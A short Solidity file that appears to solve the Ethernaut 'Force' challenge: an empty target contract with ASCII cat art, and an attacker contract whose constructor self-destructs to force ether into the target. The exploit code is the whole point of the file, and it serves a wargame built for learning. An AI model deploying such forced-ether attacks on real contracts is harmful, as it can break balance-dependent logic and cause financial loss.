// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

contract Force {
    /*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/
}

contract ForceAttacker {
    constructor(address _contractAddress) payable {
        selfdestruct(payable(_contractAddress));
    }
}
